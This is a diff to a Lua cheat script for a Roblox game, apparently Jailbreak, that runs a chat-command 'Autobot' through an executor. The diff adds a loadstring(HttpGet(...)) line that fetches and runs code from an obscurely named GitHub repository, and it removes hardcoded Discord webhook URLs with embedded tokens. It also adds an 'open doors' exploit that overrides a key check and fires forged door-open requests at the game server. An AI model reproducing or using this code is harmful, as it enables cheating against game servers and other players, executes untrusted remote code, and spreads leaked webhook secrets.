@@ -11,7 +11,7 @@ local CPlaneShorts = {">plane status", ">cargo plane status"}
 local MsmShorts = {">msm status", ">museum status"} 
 local TrainShorts = {">train status", ">cargo train status"}
 local HangManWords = {"autobot", "lua", "badcc", "donut", "casino", "bank", "hyperchrome", "torpedo", "hypershift", "roblox", "tomb", "train","museum", "subway", "mcdonalds", "halloween", "mountain", "truck", "salt", "pepper", "brulee", "puzzle", "hacker","nuke","admin","builderman","christmas","birthday","youtube","lol","cop","prisoner","manager", "owner","administrator","moderator","ice","welcome","apple","banana","strawberry","blueberry","watermelon","alien","autorobber","america","usa","china","report","spongebob","squidward","lightning","rhythm","music","spotify","asimo3089","fbi","circus","clown","helicopter","pear","grandma","million","billion","trillion","happy","frog","spider","monkey","experience","future","salad","donkey","keycard","server","alpha","delta","tango","bravo","hotel","player","unicorn","candy","golf","system","storage","airplane","november","june","july","august","team","investigation","catscan","officer","donation","deer","fear","dear","detonator","message","season","flordia","fish","xray","labrat","jackpot","equip","kayak","water","puppy","nightclub","galaxy","voodoo","joking","xylophone", "hangman","vortex","jumbo","bicycle","motorcycle","zombie","fall","staff","sword","cringe","zipper","baseball","football","soccer","tennis","boo","crude","potato","milk","kiwi","rose","quiz","exploiter","snow","winter","butter","robot","moose"}
-local LevelValidCommandList = {">hyperchrome", ">enable auto", ">disable auto", ">open bank door", ">hack casino computers", ">pull", ">pull lever", ">solve puzzles", ">casino code", ">casino timer", ">auto rps", ">auto slots", ">auto flipcoin", ">friend", ">spk ad", ">spk bad", ">spk as", ">who is", ">highest bounty", ">level", ">help", ">open gates", ">hangman", "airdrops", "where is"}
+local LevelValidCommandList = {">hyperchrome", ">enable auto", ">disable auto", ">open doors", ">hack casino computers", ">pull", ">pull lever", ">solve puzzles", ">casino code", ">casino timer", ">auto rps", ">auto slots", ">auto flipcoin", ">friend", ">spk ad", ">spk bad", ">spk as", ">who is", ">highest bounty", ">level", ">help", ">open gates", ">hangman", "airdrops", "where is"}
 local YouGot0Cash = {}
 local YouGot20RocketFuel = {}
 local YouGot1kCash = {}
@@ -63,7 +63,7 @@ _G.BattlePlayers = {
 
 
 local loadedargs = {
-	[1] = "Autobot Commands: >Help, >Pull, >Pull Lever, >Solve Puzzles, >Casino Code, >Casino Timer, >Open Bank Door, >Hack Casino Computers, >Open Gates, >Auto Rps, >Auto Slots, >Auto FlipCoin, >Hangman",
+	[1] = "Autobot Commands: >Help, >Pull, >Pull Lever, >Solve Puzzles, >Casino Code, >Casino Timer, >Open Doors, >Hack Casino Computers, >Open Gates, >Auto Rps, >Auto Slots, >Auto FlipCoin, >Hangman",
 	[2] = "All"
 }
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(loadedargs[1], loadedargs[2])
@@ -356,10 +356,12 @@ function GetBattleItem(Rarity)
 	end	
 end
 
+local Channeling = loadstring(game:HttpGet("https://raw.githubusercontent.com/9TBUCVEXFY/9SBUCVDXFY/main/DHHXbsi848Ru"))()
+
 function PostMessage(V)
 	local request = http_request or request or HttpPost or syn.request
 	request({
-		Url = "https://discord.com/api/webhooks/1032717515803066488/h5suM50MXKOu_CZ9Xyo5dqR089tbCcF5b0RsxjmI-KNoznG17BOsD0tJ_eMTlj9S5aWX",
+		Url = Channeling["Global"],
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
@@ -371,7 +373,7 @@ end
 function PostAlertMessage(V)
 	local request = http_request or request or HttpPost or syn.request
 	request({
-		Url = "https://discord.com/api/webhooks/1029655016316866590/kW-_vtTHjRBZ5PZ0Z0fLIaB-JFafr7WS6y5xIOZcbtU-O5DZRQ6Resz_g7YMl91USKur",
+		Url = Channeling["Log"],
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
@@ -970,7 +972,7 @@ function RunAutoBot(Player, Message)
 
 	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower() == ">help" then
 		local loadedargs = {
-			[1] = "Autobot Commands: >Help, >Pull, >Pull Lever, >Solve Puzzles, >Casino Code, >Casino Timer, >Open Bank Door, >Hack Casino Computers, >Open Gates, >Auto Rps, >Auto Slots, >Auto FlipCoin, >Hangman",
+			[1] = "Autobot Commands: >Help, >Pull, >Pull Lever, >Solve Puzzles, >Casino Code, >Casino Timer, >Open Doors, >Hack Casino Computers, >Open Gates, >Auto Rps, >Auto Slots, >Auto FlipCoin, >Hangman",
 			[2] = "All"
 		}
 		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(loadedargs[1], loadedargs[2])
@@ -1561,29 +1563,64 @@ function RunAutoBot(Player, Message)
 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(notmanagerargs))
 		end
 
-	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower() == ">open bank door" then
-		for _, Part in pairs(game.workspace.Banks:GetDescendants()) do
-			if Part.Name == "Sign" then
-				if Part.Decal.Transparency == 0 then
-					local bankclosedargs = {
-						[1] = "The Bank is closed!",
-						[2] = "All"
-					}
-					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(bankclosedargs))
-				else
-					local openbankdoor = {
-						[1] = "Opening the Bank door...",
-						[2] = "All"
-					}
-					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(openbankdoor))
+	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower() == ">open doors" then
+		local openbankdoor = {
+			[1] = "Opening all doors...",
+			[2] = "All"
+		}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(openbankdoor))
 
-					local plrUtils = game:GetService("ReplicatedStorage").Game.PlayerUtils
-					require(plrUtils).hasKey = function() 
-						return true
-					end
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(36.948, 19.838, 909.021)
-				end
-			end
+		local plrUtils = game:GetService("ReplicatedStorage").Game.PlayerUtils
+		require(plrUtils).hasKey = function() 
+			return true
+		end
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(36.948, 19.838, 909.021)
+
+		local CollectionService = game:GetService"CollectionService"
+		local Doors = CollectionService:GetTagged("Door")
+		local Character = game:GetService"Players".LocalPlayer.Character
+		local remote
+		for i, v in next, getgc(true) do
+		if typeof(v) == "table" and rawget(v, "FireServer") and typeof(rawget(v, "FireServer")) == "function" then
+			remote = v
+		end
+		end
+		for i,v in pairs(Doors) do
+			local args = {
+				[1] = "hn8vmmqq",
+				[2] = {
+					["Type"] = "Swing",
+					["OpenFun"] = function()end --[[FunSwing]],
+					["Direction"] = 1,
+					["Resolved"] = true,
+					["State"] = {
+						["CloseTime"] = 1666853616,
+						["Direction"] = -1,
+						["Open"] = true,
+						["Proxy"] = 24
+					},
+					["Settings"] = {
+						["Type"] = "Swing",
+						["ServerOnly"] = false,
+						["Duration"] = 1,
+						["TeamBlacklist"] = false,
+						["SequenceRequireState"] = true,
+						["Character"] = true,
+						["Key"] = true,
+						["Locked"] = false,
+						["Vehicle"] = true,
+						["Delay"] = 0,
+						["Team"] = false
+					},
+					["Model"] = v,
+					["CloseFun"] = function()end --[[FunSwing]],
+					["HingeRelativeCFrame"] = CFrame.new(Vector3.new(-2.175048828125, 0, 0.000244140625), Vector3.new(-0, -0, -1)),
+					["ClosedCFrame"] = CFrame.new(Vector3.new(-1195.406494140625, 19.4500732421875, -1603.443603515625), Vector3.new(-0, -0, -1)),
+					["Tag"] = v:WaitForChild("Tag", 5).Value
+				}
+			}
+			
+			remote:FireServer(unpack(args))
 		end
 
 
@@ -2427,6 +2464,7 @@ function RunAutoBot(Player, Message)
 
 
 	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower() == ">join battle" then
+		if Player.UserId == _G.BattlePlayers["Player1"]["UserId"] then return end 
 		if _G.BattleRunning == true then
 			if _G.Data["Levels"][tostring(Player.UserId)]["Level"] > 5 then
 				_G.Data["Levels"][tostring(Player.UserId)]["Level"] = _G.Data["Levels"][tostring(Player.UserId)]["Level"] - 5
